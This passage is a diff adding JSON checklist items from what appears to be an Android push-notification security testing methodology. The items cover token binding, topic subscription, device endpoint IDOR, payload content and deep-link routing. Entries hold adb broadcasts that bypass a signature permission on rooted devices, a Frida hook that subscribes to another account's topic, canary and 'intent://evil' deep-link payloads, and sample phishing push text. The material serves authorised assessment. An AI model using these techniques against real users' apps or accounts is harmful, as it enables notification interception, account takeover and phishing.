+    "mastg": [
+     "MASTG-KNOW-0026"
+    ],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-862"
+    ],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D18-034",
+    "D24-002",
+    "D24-010",
+    "D24-011",
+    "D24-013"
+   ],
+   "domain_refs": [
+    "D18"
+   ],
+   "has_code": true,
+   "skip_when": "",
+   "test": "A push finding is rated by who can send it. Build the table of every backend route that\nresults in a push to *another* account (message, friend request, mention, share, invite, \"remind a\nfriend\", admin notify, support reply, transactional event) with the recipient selector each one takes\n(user id, phone, email, topic, device id) and the auth it demands. The table decides whether D24-011..016\nare AM-05 (a second account), AM-01 (an unauthenticated route) or only AM-09 (the backend itself).",
+   "how": "```bash\ngrep -iE 'notif|push|remind|invite|share|mention|message|alert' inventory/endpoints.csv | tee logs/D24-003.txt\n# for each candidate, with the proxy on: send from account A to account B's identifier and watch B's device\n# (your second handset or a second AVD signed in as B); record route, selector, auth, and whether B received it\n```\nJoin with D24-002: which of these routes produced the captured payload, and which keys it set.",
+   "proof": "A table in `logs/D24-003.txt` with at least one row per selector type, each marked\n`delivered`/`not delivered` from an A→B trial.",
+   "escalation": "A route whose selector is guessable and whose text is free is D24-011; one whose\nselector is a topic is D24-010; an unauthenticated one is AM-01 and lifts every payload item one band.",
+   "ruled_out_when": "Every row requires an authenticated session and a recipient relationship the\nvictim consented to (contact, group member, follower), and no row accepts free text — then the push\nblock's remote attacker is AM-09 only and D24-013..016 are rated as D18-034 rates them."
+  },
+  {
+   "id": "D24-004",
+   "domain": "D24",
+   "title": "Positive-control discipline: every \"handler ignores key X\" negative is proved by a delivered canary",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — methodology gate",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Every negative result in D24-013..023",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "`docs/04-poc-and-evidence-standard.md` (negative control in the same take); MASTG-TECH-0043",
+   "record": "`logs/D24-004.txt` (one canary line per negative, with the message id)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TECH-0043"
+    ],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D05-025",
+    "D24-002",
+    "D24-003",
+    "D24-013",
+    "D24-017"
+   ],
+   "domain_refs": [
+    "D05"
+   ],
+   "has_code": true,
+   "skip_when": "",
+   "test": "\"The handler ignores `url`\" is only true if a message carrying `url` was delivered and\nobserved. Three legitimate harnesses exist, in order of evidential weight: (a) the product's own send\npath to your own account (D24-003); (b) a send credential you own for the same project — never the\nclient's recovered credential against anyone but your own token (D24-017); (c) the root harness: on a\nrooted lab device, broadcast the provider's receive action to the SDK receiver with the keys from\nD24-002. (c) proves what the handler does, not that an attacker can reach it — label it `AM-12 harness`.",
+   "how": "```bash\nRCV=$(grep -B2 -A6 'c2dm.intent.RECEIVE' \"$DEC/apktool/AndroidManifest.xml\" | grep -oE 'android:name=\"[^\"]+\"' | head -1 | cut -d'\"' -f2)\nadb -s \"$SERIAL\" root && adb -s \"$SERIAL\" shell \"am broadcast -a 'com.google.android.c2dm.intent.RECEIVE' -n '$PKG/$RCV' \\\n  --es 'from' '000000000000' --es 'google.message_id' 'd24-canary-$(date +%s)' \\\n  --es 'url' 'https://zq7x4mk9.collab.example/d24' --es 'deeplink' 'targetapp://web?url=https://zq7x4mk9.collab.example/'\"\nadb -s \"$SERIAL\" logcat -d --pid=\"$(adb -s \"$SERIAL\" shell pidof -s \"$PKG\")\" | grep -E 'D24-002|zq7x4mk9' | tee -a \"$E/logs/D24-004.txt\"\n```\nThen `adb -s \"$SERIAL\" unroot` before any reachability item. The receiver's `c2dm.permission.SEND`\nsignature permission is what the root shell bypasses; an unrooted shell gets `SecurityException` — that\nis D05-025's oracle, not a harness failure.",
+   "proof": "For every negative in the push block, a `logs/D24-004.txt` line showing the canary message\nid delivered (hook line or dumpsys entry) and the sink *not* reached.",
+   "escalation": "n/a — this is what makes D24-013..016 defensible when they come back empty.",
+   "ruled_out_when": "Not applicable; a negative without a delivered canary is `untested`, and the row\nstays open."
+  },
+  {
+   "id": "D24-005",
+   "domain": "D24",
+   "title": "Count every payload sweep — the shell-loop ban applied to push keys and message objects",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — methodology gate",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Any sweep over more than five keys, ids or messages in this chapter",
+   "requires": "—",
+   "requires_tags": [
+    "—"
+   ],
+   "maps_to": "D13-005 (the rule and the Python shape); `bb-methodology` PART 4 \"Shell-Loop Ban\"",
+   "record": "`logs/D24-005.txt` (per-iteration lines and the final count assertion)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D13-005",
+    "D24-009",
+    "D24-013",
+    "D24-036"
+   ],
+   "domain_refs": [
+    "D13"
+   ],
+   "has_code": false,
+   "skip_when": "",
+   "test": "This is D13-005 applied here: a key sweep over `onMessageReceived`, an id sweep over\nmessages or devices, or a channel-name sweep that prints no count has proved nothing.",
+   "how": "Python with `try/except` per iteration, one log line per iteration, and\n`assert seen == len(inputs)` at the end — exactly the D13-005 template with the request swapped for the\nroute under test. Shell loops of five or fewer hardcoded items are fine.",
+   "proof": "The final line of `logs/D24-005.txt` is the assertion passing with the input count.",
+   "escalation": "n/a — makes D24-009, D24-036 and D24-013 defensible.",
+   "ruled_out_when": "Not applicable; a sweep whose line count is below its input count is not evidence."
+  },
+  {
+   "id": "D24-006",
+   "domain": "D24",
+   "title": "Pre-severity gate for push findings: rate on the action the payload drives",
+   "severity": "support",
+   "severity_floor": "support",
+   "severity_note": "Support",
+   "vrt": "n/a — governs the rating of D24-007..031",
+   "vrt_priority": "n/a",
+   "vrt_best": "n/a",
+   "attacker": "AM-01",
+   "attacker_ids": [
+    "AM-01"
+   ],
+   "applies_to": "Every candidate finding in the push and notification blocks before it is written up",
+   "requires": "—",
+   "requires_tags": [
+    "—"
+   ],
+   "maps_to": "`docs/02-severity-and-reportability.md`; `docs/06-triage-playbook.md`; `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam` (P5) and `insufficient_security_configurability.lack_of_notification_email` (P5) as the nodes a lazy report lands on",
+   "record": "`logs/D24-006.txt` (one pass/kill line per candidate with the reason)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "insufficient_security_configurability.lack_of_notification_email",
+     "sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam"
+    ]
+   },
+   "xrefs": [
+    "D24-003",
+    "D24-011"
+   ],
+   "domain_refs": [
+    "D09",
+    "D10"
+   ],
+   "has_code": false,
+   "skip_when": "",
+   "test": "Four kills and one rule. Kills: content visible to the push provider or on its dashboard is\nthe provider's trust model, not a finding; \"push is not end-to-end encrypted\" is the same; notification\nspam without an authorisation bypass is P5; a crash from a malformed payload is P5 unless it persists or\nreaches a memory sink. Rule: the severity is the VRT node of the **action** — the route that opened\n(D09/D10 node), the object that changed (IDOR node), the OTP that moved (auth-bypass node) — and the\npush is the delivery clause in the attack-scenario sentence.",
+   "how": "For each candidate write one line: `D24-NNN <candidate> → action=<what changed> node=<vrt\npath> attacker=<AM-xx from D24-003> → PASS|KILL <reason>`.",
+   "proof": "The line exists for every candidate before `findings/` gets a folder.",
+   "escalation": "n/a — the gate is what keeps D24-011..016 out of the P5 branch.",
+   "ruled_out_when": "Not applicable; a report filed without the line is the domain's commonest\nself-inflicted downgrade."
+  },
+  {
+   "id": "D24-007",
+   "domain": "D24",
+   "title": "Registration token bound to the wrong account — the client-side half of D15-055",
+   "severity": "high",
+   "severity_floor": "high",
+   "severity_note": "High",
+   "vrt": "`broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2)",
+   "vrt_priority": "P2",
+   "vrt_best": "P2",
+   "attacker": "AM-05 — a second account; AM-01 when the registration route takes no session",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "Every app that uploads a push token to a backend in scope. The server-side rule (does `/devices` bind the token to the caller's session?) is D15-055; this item owns what the **client** sends with the token and the on-device proof.",
+   "requires": "push, backend-api, two-accounts, mitm",
+   "requires_tags": [
+    "push",
+    "backend-api",
+    "two-accounts",
+    "mitm"
+   ],
+   "maps_to": "MASWE-0018; CWE-862; D15-055 (owner of the server-side check); D13-083 (enrolment endpoint)",
+   "record": "`logs/D24-007.txt`; `requests/E-NNN.http` (the registration call as sent and as replayed); `screenshots/D24-007-1.png` (B's content on A's device)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0018"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-862"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers"
+    ]
+   },
+   "xrefs": [
+    "D13-083",
+    "D15-055",
+    "D24-010",
+    "D24-047"
+   ],
+   "domain_refs": [
+    "D13",
+    "D15"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'onNewToken\\(|getToken\\(' \"$DEC/jadx/sources\" | wc -l` prints 0 and the proxy shows no registration call after login — write `n/a — D24-007: the client never uploads a push token (no onNewToken/getToken, no registration request)`.",
+   "test": "Read the registration call the client makes on `onNewToken` and on login: which identifiers\naccompany the token (user id, phone, device id, installation id) and which of them the server believes.\nA body that names the user is an invitation to re-point; a token refresh that re-registers without the\nsession is a second one. The proof is a notification for account B arriving on the device signed in as A.",
+   "how": "```bash\ngrep -rnE 'onNewToken\\(|getToken\\(|registerDevice|/devices|/push/register|pushToken|fcmToken|deviceToken' \"$DEC/jadx/sources\" | head -40\n# proxy on, log in as A, capture the registration request; replay it with A's session and B's user id / phone / device id\n# then, from a second device or account B's session, trigger an event that notifies B (a message from a third account you own, a login alert)\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -B2 -A10 \"pkg=$PKG\" | grep -E 'zq7x4mk9|<canary text>' | tee \"$E/logs/D24-007.txt\"\n```",
+   "proof": "The replayed registration returns success with B's identifier, and B's canary notification is\nposted on A's device (dumpsys line plus screenshot). The server-side half is filed under D15-055 with\nthe request pair; this row holds the delivered proof.",
+   "escalation": "→ D24-010 / D24-047 when the delivered content is an OTP or an approval\n(`broken_authentication_and_session_management.authentication_bypass`, P1); → D13-083 for the device\nenrolment that trusts the same identifier.",
+   "ruled_out_when": "The registration body carries only the token and the server derives the owner from\nthe session: the replay with B's identifier is rejected or the identifier is ignored (show the body\ndiff, not the status code — a `400 field required` proves nothing), and `onNewToken` re-registers under\nthe current session (file:line of the authenticated call)."
+  },
+  {
+   "id": "D24-008",
+   "domain": "D24",
+   "title": "Token not unregistered on logout or account switch — the next user receives the previous user's pushes",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "High when the delivered content is a message body, OTP or balance; Medium otherwise",
+   "vrt": "`broken_authentication_and_session_management.failure_to_invalidate_session.on_logout` (P4); argue up on the content delivered — `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies)",
+   "vrt_priority": "P4",
+   "vrt_best": "P4",
+   "attacker": "AM-11 — the next user of the same handset (shared, demo, resold or family device); AM-05 for the account-switch variant inside one app",
+   "attacker_ids": [
+    "AM-05",
+    "AM-11"
+   ],
+   "applies_to": "Every app with a push transport and a logout or account-switch path",
+   "requires": "push, backend-api, two-accounts, device",
+   "requires_tags": [
+    "push",
+    "backend-api",
+    "two-accounts",
+    "device"
+   ],
+   "maps_to": "MASWE-0024 (sensitive data accessible after session termination); CWE-613; D20-062 and D13-087 (the deletion variant)",
+   "record": "`logs/D24-008.txt`; `requests/E-NNN.http` (the logout call: does it carry an unregister?); `screenshots/D24-008-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [
+     "MASWE-0024"
+    ],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-613"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_authentication_and_session_management.failure_to_invalidate_session.on_logout",
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D13-087",
+    "D20-062",
+    "D24-012"
+   ],
+   "domain_refs": [
+    "D13",
+    "D20"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -c 'MESSAGING_EVENT\\|c2dm\\|hms.push' \"$DEC/apktool/AndroidManifest.xml\"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-008: no push transport (probe 1 = 0)`.",
+   "test": "Log out of A, log in as B on the same device, then make A's backend emit a push. If the\ntoken row still belongs to A server-side, A's content lands on the handset B is using. Two mechanisms:\nthe logout path never calls the unregister route, or it deletes the local token\n(`deleteToken()`) without telling the server, so the server keeps sending to a token the device still\nholds.",
+   "how": "```bash\ngrep -rnE 'deleteToken\\(|unregister|/devices/.*DELETE|logout' \"$DEC/jadx/sources\" | grep -iE 'push|token|device' | head -20\n# proxy on: log out A and capture whether any unregister request leaves; log in B on the same device\n# from a second device, trigger A's event (message to A, login alert for A); then:\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -B2 -A10 \"pkg=$PKG\" | tee \"$E/logs/D24-008.txt\"\n# account-switch variant: switch A→B inside the app without logout and repeat\n```",
+   "proof": "A's canary content posted on the device while B is signed in, with the logout request (or its\nabsence) in `requests/`.",
+   "escalation": "→ D24-012 for what the content is; → D13-087 / D20-062 when deletion (not logout)\nleaves the registration alive.",
+   "ruled_out_when": "The logout request carries the token (or device id) to an unregister route and the\nA→B trial delivers nothing within the provider's retry window; record both the request and the empty\ndumsys grep with the trigger time."
+  },
+  {
+   "id": "D24-009",
+   "domain": "D24",
+   "title": "Device and token management endpoints enumerable across users",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "High for delete or re-point; Medium for listing",
+   "vrt": "`broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for rename/delete",
+   "vrt_priority": "P3",
+   "vrt_best": "P2",
+   "attacker": "AM-05",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Apps whose backend exposes `/devices`, `/sessions`, `/push/tokens` or a \"manage devices\" screen",
+   "requires": "push, backend-api, two-accounts",
+   "requires_tags": [
+    "push",
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-639; D15-039 (UUID version and the AC:H argument); D15-057 (preference and unsubscribe endpoints)",
+   "record": "`logs/D24-009.txt` (the counted sweep); `requests/E-NNN.http`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-639"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers",
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers"
+    ]
+   },
+   "xrefs": [
+    "D15-039",
+    "D15-057",
+    "D22-019",
+    "D24-005",
+    "D24-007"
+   ],
+   "domain_refs": [
+    "D15",
+    "D22"
+   ],
+   "has_code": false,
+   "skip_when": "the endpoint map has no device, session or token-management route (`grep -ciE 'device|session|push/token' inventory/endpoints.csv` = 0) — write `n/a — D24-009: no device-management route in the endpoint map`.",
+   "test": "The device list is an object space like any other. Read B's device metadata (model, last\nseen, push token, IP) with A's session, rename B's device, or delete it so B stops receiving\nsecurity alerts — a silent precondition for an account takeover that would otherwise be noticed.",
+   "how": "From the endpoint map, take the device routes; with A's session, request B's device id\n(obtained from B's own list) on `GET`, `PATCH`, `DELETE`; if ids are sequential, run the D24-005-style\ncounted sweep over a bounded range you own; record the body diff for each verb.",
+   "proof": "B's device row returned or changed with A's session (body diff), or B's device no longer\nreceives a push after A's `DELETE`.",
+   "escalation": "→ D22-019 join: deleting the victim's device suppresses the breach-alert channel; →\nD24-007 when the row can be re-pointed.",
+   "ruled_out_when": "Every verb with B's id under A's session returns the same response as a random id\n(scoped lookup — show the diff is empty), and ids are v4 UUIDs that leak nowhere in the app (D15-039)."
+  },
+  {
+   "id": "D24-010",
+   "domain": "D24",
+   "title": "Topic or segment subscription derived from a guessable id — the on-device half of D15-056",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "Critical when the topic carries an OTP, approval or balance; High for messages and orders",
+   "vrt": "`broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_authentication_and_session_management.authentication_bypass` (P1) when the delivered value authenticates",
+   "vrt_priority": "P3",
+   "vrt_best": "P1",
+   "attacker": "AM-05 — any install of the app with its own account",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "Apps that call a provider's topic, tag, segment or external-user-id API with a value derived from a user, order, tenant or account id. The server-side statement (no authorisation on subscribe) is D15-056; this item owns the hook and the delivered proof.",
+   "requires": "push, two-accounts, frida, device",
+   "requires_tags": [
+    "push",
+    "two-accounts",
+    "frida",
+    "device"
+   ],
+   "maps_to": "CWE-862; MASTG-TECH-0043; D15-056 (owner)",
+   "record": "`logs/D24-010.txt` (hook output: every topic name); `screenshots/D24-010-1.png` (B's content delivered via the topic)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-TECH-0043"
+    ],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-862"
+    ],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.view_sensitive_information_iterable_object_identifiers",
+     "broken_authentication_and_session_management.authentication_bypass"
+    ]
+   },
+   "xrefs": [
+    "D15-056",
+    "D24-002",
+    "D24-012",
+    "D24-047"
+   ],
+   "domain_refs": [
+    "D15"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rlE 'subscribeToTopic\\(|\\.subscribe\\(\"|addTag\\(|setExternalUserId\\(|setAlias\\(' \"$DEC/jadx/sources\" | wc -l` prints 0 — write `n/a — D24-010: no topic, tag or alias subscription call site in $DEC`.",
+   "test": "`subscribeToTopic()` and its vendor equivalents (`subscribe`, `addTag`, `setExternalUserId`,\n`setAlias`) are client requests. Hook them to learn the naming scheme, then subscribe your own install\nto a sibling name built from B's id and make B's event fire. A delivered message whose `getFrom()`\nstarts with `/topics/` is the scheme's confession.",
+   "how": "```bash\ngrep -rnE 'subscribeToTopic\\(|unsubscribeFromTopic\\(|\\.subscribe\\(\"|addTag\\(|setExternalUserId\\(|setAlias\\(' \"$DEC/jadx/sources\" | head\ncat > \"$E/frida/d24-010.js\" <<'JS'\nJava.perform(function () {\n  var FM = Java.use('com.google.firebase.messaging.FirebaseMessaging');\n  FM.subscribeToTopic.implementation = function (t) { console.log('[D24-010] subscribeToTopic ' + t); return this.subscribeToTopic(t); };\n  // subscribe this install to the sibling name: replace USER_B_ID with the id of the second account you own\n  FM.getInstance().subscribeToTopic('user_USER_B_ID');\n});\nJS\nfrida -D \"$SERIAL\" -n \"$PKG\" -l \"$E/frida/d24-010.js\" -q -t 60 | tee \"$E/logs/D24-010.txt\"\n# trigger B's event from B's device; then dumpsys / the D24-002 hook on A's device\n```",
+   "proof": "The hook log shows the naming scheme; B's canary content posts on A's device after the\nself-subscription, and the D24-002 hook shows `from=/topics/user_<B>`.",
+   "escalation": "→ `authentication_bypass` (P1) when the topic carries an OTP or an approval prompt\n(D24-047); → D24-012 for the content class; D15-056 holds the backend write-up.",
+   "ruled_out_when": "Every topic name in the hook log is static (`news`, `promo`, a locale) and per-user\ncontent arrives with `from=<sender id>` (direct-to-token) — record both the topic list and one\nper-user message's `from`."
+  },
+  {
+   "id": "D24-011",
+   "domain": "D24",
+   "title": "A user-reachable route sends free text, a title or a deep link to other users under the app's brand",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "High when the text or link is unbounded and unattributed; Medium when bounded",
+   "vrt": "`broken_access_control.privilege_escalation` (varies) when a non-admin reaches an admin or system notify route; `server_side_injection.content_spoofing.text_injection` (P5) is where the same report lands without the authorisation angle; `server_security_misconfiguration.no_rate_limiting_on_form.sms_triggering` (P4) for the SMS variant",
+   "vrt_priority": "varies",
+   "vrt_best": "P4",
+   "attacker": "AM-05; AM-01 when the route takes no session",
+   "attacker_ids": [
+    "AM-01",
+    "AM-05"
+   ],
+   "applies_to": "Any backend with \"notify\", \"remind\", \"invite\", \"share\", \"mention\" or admin-broadcast routes (D24-003 table)",
+   "requires": "push, backend-api, two-accounts",
+   "requires_tags": [
+    "push",
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "CWE-862; CWE-20; ATT&CK T1660 (phishing), T1655 (masquerading); D13-047 (SMS flooding and cost)",
+   "record": "`logs/D24-011.txt`; `requests/E-NNN.http`; `screenshots/D24-011-1.png` (the rendered push on B's device)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [
+     "CWE-20",
+     "CWE-862"
+    ],
+    "attack": [
+     "T1655",
+     "T1660"
+    ],
+    "vrt": [
+     "broken_access_control.privilege_escalation",
+     "server_security_misconfiguration.no_rate_limiting_on_form.sms_triggering",
+     "server_side_injection.content_spoofing.text_injection"
+    ]
+   },
+   "xrefs": [
+    "D13-047",
+    "D24-003",
+    "D24-005",
+    "D24-013",
+    "D24-014",
+    "D24-022"
+   ],
+   "domain_refs": [
+    "D13"
+   ],
+   "has_code": false,
+   "skip_when": "the D24-003 table has no route whose body reaches another user (every row is `not delivered` or system-templated with no free field) — write `n/a — D24-011: no user-to-user notify route (D24-003 table attached)`.",
+   "test": "From the D24-003 table, take every route whose body reaches another user's drawer. Send\nattacker-chosen title, body and deep link to B and look at what B's drawer shows: is the sender named,\nis the text templated server-side, is the deep link server-chosen? Unattributed free text under the\nvendor's icon is the phishing primitive; a sender-chosen deep link is the delivery clause for\nD24-013/014.",
+   "how": "With the proxy on, trigger each route from A to B's identifier; then replay with the text\nfields replaced (`\"Your account is locked — confirm your password\"`), with a deep link to a collab host,\nand with B's identifier swapped for a third account you own. Count the routes (D24-005) and record the\nrendering on B's device.",
+   "proof": "B's drawer shows your text and/or opens your link, with the request that produced it. The\nSMS variant: B's handset receives your text from the vendor's sender id.",
+   "escalation": "→ D24-013 / D24-014 when the link reaches the router or a WebView; → D24-022 when the\nroute posts full-screen or call-style; → D13-047 when the route is unthrottled SMS.",
+   "ruled_out_when": "Every route templates the text server-side (your body is replaced — show the diff),\nnames the sender in the rendering, and the deep link is server-chosen (your `link` field is dropped)."
+  },
+  {
+   "id": "D24-012",
+   "domain": "D24",
+   "title": "Sensitive content in the push payload itself — transits the provider and lands in every drawer reader",
+   "severity": "high",
+   "severity_floor": "medium",
+   "severity_note": "High for an OTP, approval code or full card/account number; Medium for balances, message bodies and PII",
+   "vrt": "`sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `broken_authentication_and_session_management.two_fa_bypass` (P3) when the value is the OTP and a listener or the lock screen reads it",
+   "vrt_priority": "varies",
+   "vrt_best": "P3",
+   "attacker": "AM-04 (notification listener) / AM-10 (lock screen) — the push provider's own visibility is not an attacker model (D24-006)",
+   "attacker_ids": [
+    "AM-04",
+    "AM-10"
+   ],
+   "applies_to": "Every app whose backend puts values, not pointers, in the payload",
+   "requires": "push, device",
+   "requires_tags": [
+    "push",
+    "device"
+   ],
+   "maps_to": "MASWE-0037; MASTG-TEST-0315; MASTG-DEMO-0078; rule `mastg-android-sensitive-data-in-notifications`; ATT&CK T1517; D13-048 (the OTP channel set), D20-030, D20-033",
+   "record": "`logs/D24-012.txt` (payload capture with the value, redacted in the report); `screenshots/D24-012-1.png` (the value in a reader)",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-DEMO-0078",
+     "MASTG-TEST-0315"
+    ],
+    "maswe": [
+     "MASWE-0037"
+    ],
+    "masvs": [],
+    "rules": [
+     "mastg-android-sensitive-data-in-notifications"
+    ],
+    "cwe": [],
+    "attack": [
+     "T1517"
+    ],
+    "vrt": [
+     "broken_authentication_and_session_management.two_fa_bypass",
+     "sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure"
+    ]
+   },
+   "xrefs": [
+    "D13-048",
+    "D20-030",
+    "D20-031",
+    "D20-033",
+    "D22-047",
+    "D24-002",
+    "D24-024",
+    "D24-031"
+   ],
+   "domain_refs": [
+    "D13",
+    "D20",
+    "D22"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -c 'MESSAGING_EVENT\\|c2dm\\|hms.push' \"$DEC/apktool/AndroidManifest.xml\"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-012: no push transport (probe 1 = 0)`.",
+   "test": "The D24-002 capture shows whether the payload carries the value or an id the app resolves\nwith an authenticated fetch. A value in the payload is readable at four points the app does not\ncontrol: the provider, notification history, any granted listener, and the keyguard. Rate on the most\nsensitive value and the weakest reader that sees it.",
+   "how": "```bash\ngrep -E 'otp|code|pin|balance|amount|iban|card|ssn|dob|address|body' \"$E/logs/D24-002.txt\" | tee \"$E/logs/D24-012.txt\"\ngrep -rnE 'getData\\(\\)\\.get\\(\"(otp|code|pin|balance|amount|body|message)\"' \"$DEC/jadx/sources\" | head\nadb -s \"$SERIAL\" shell dumpsys notification --noredact | grep -A12 \"pkg=$PKG\" | grep -iE 'text=|title=' | tee -a \"$E/logs/D24-012.txt\"\n# readers: lock screen (D20-030), history (D20-033), listener (D20-031 PoC), companion (D24-024)\n```",
+   "proof": "The value in the captured payload **and** in at least one reader the user did not\nexplicitly trust with it (history or listener output, lock-screen screenshot).",
+   "escalation": "→ D13-048 and D22-047 for the OTP chain; → D20-031 PoC listener; → D24-031 when a\none-time token for a route rides in the extras.",
+   "ruled_out_when": "Payloads are content-free (an id plus a type) and the posted text is built from an\nauthenticated fetch (file:line of the fetch; the `--noredact` dumpsys shows no secret), or the channel\nposts `VISIBILITY_SECRET` with a `setPublicVersion` that carries none of it (D20-030)."
+  },
+  {
+   "id": "D24-013",
+   "domain": "D24",
+   "title": "Push payload routed into the deep-link router without the browser path's allow-list",
+   "severity": "critical",
+   "severity_floor": "high",
+   "severity_note": "High; Critical when the route reaches the session WebView or an authenticated action",
+   "vrt": "rated on the route the push opens — the D09/D10 node of the sink",
+   "vrt_priority": "varies",
+   "vrt_best": "varies",
+   "attacker": "AM-05 / AM-01 with D24-011; AM-03 with D05-025; AM-09 otherwise",
+   "attacker_ids": [
+    "AM-01",
+    "AM-03",
+    "AM-05",
+    "AM-09"
+   ],
+   "applies_to": "Handlers that pass a payload key (`url`, `deeplink`, `link`, `click_action`, `gcm.n.link`) to the router or to `Intent.parseUri`",
+   "requires": "push, deeplink",
+   "requires_tags": [
+    "push",
+    "deeplink"
+   ],
+   "maps_to": "MASWE-0029; MASTG-TEST-0394; MASTG-BEST-0071; MASTG-TECH-0173; rule `mastg-android-deeplink-unvalidated-parameter`; D09-039 (notification-origin trust)",
+   "record": "`logs/D24-013.txt` (hook trace of the route taken); `screenshots/D24-013-1.png`",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [
+     "MASTG-BEST-0071",
+     "MASTG-TECH-0173",
+     "MASTG-TEST-0394"
+    ],
+    "maswe": [
+     "MASWE-0029"
+    ],
+    "masvs": [],
+    "rules": [
+     "mastg-android-deeplink-unvalidated-parameter"
+    ],
+    "cwe": [],
+    "attack": [],
+    "vrt": []
+   },
+   "xrefs": [
+    "D09-001",
+    "D09-039",
+    "D10-004",
+    "D24-004",
+    "D24-011",
+    "D24-020"
+   ],
+   "domain_refs": [
+    "D09",
+    "D10"
+   ],
+   "has_code": true,
+   "skip_when": "`inventory/deeplinks.csv` is empty and `grep -rlE 'parseUri\\(' \"$DEC/jadx/sources\" | wc -l` = 0 — write `n/a — D24-013: no deep-link router and no parseUri in $DEC`.",
+   "test": "Push-origin routes are routinely trusted more than browser-origin ones: the router skips its\nhost allow-list, honours a `from_notification` flag or a signature whose key is in the APK (D09-039), or\naccepts `intent:` URIs the browser path rejects. Send the same off-allow-list route by push and by\n`adb shell am start` and diff the behaviour.",
+   "how": "```bash\ngrep -rnE 'parseUri\\(|Uri\\.parse\\(.*(getData|getString)\\(|from_notification|fromPush|isPush' \"$DEC/jadx/sources\" | head -20\nfrida -D \"$SERIAL\" -n \"$PKG\" -l frida/03-deeplink-trace.js -q -t 300 | tee \"$E/logs/D24-013.txt\" &\n# self-send (D24-004 harness or the D24-011 route) a payload whose link is OFF the D09-001 allow-list:\n#   --es 'deeplink' 'targetapp://web?url=https://zq7x4mk9.collab.example/'   and   --es 'link' 'intent://evil#Intent;scheme=targetapp;end'\n# browser-path control: the same URI via  adb -s \"$SERIAL\" shell \"am start -a 'android.intent.action.VIEW' -d 'targetapp://web?url=https://zq7x4mk9.collab.example/'\"\n```",
+   "proof": "The trace shows the push-delivered route opening (a request to the collab host, the activity\nstarted) while the identical browser-path URI is refused — the differential is the finding.",
+   "escalation": "→ D10-004 when the route lands in the session WebView; → D09-039 when the trust is a\nsignature with its key in the package; → D24-020 when the tap Intent is built from the same field.",
